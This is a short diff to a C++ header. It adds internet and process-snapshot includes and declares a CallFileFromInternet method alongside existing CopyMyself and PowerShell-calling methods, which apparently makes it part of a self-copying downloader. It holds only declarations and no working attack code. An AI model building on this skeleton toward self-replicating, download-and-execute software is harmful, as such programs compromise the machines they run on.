@@ -1,5 +1,7 @@
 #include <Windows.h>
 #include <strsafe.h>
+#include <WinInet.h>
+#include <TlHelp32.h>
 #include <string>
 #include <iostream>
 
@@ -12,4 +14,5 @@ public:
 	string current_working_directory();
 	void call_ps(string filename);
 	void CopyMyself();
+	void CallFileFromInternet();
 };
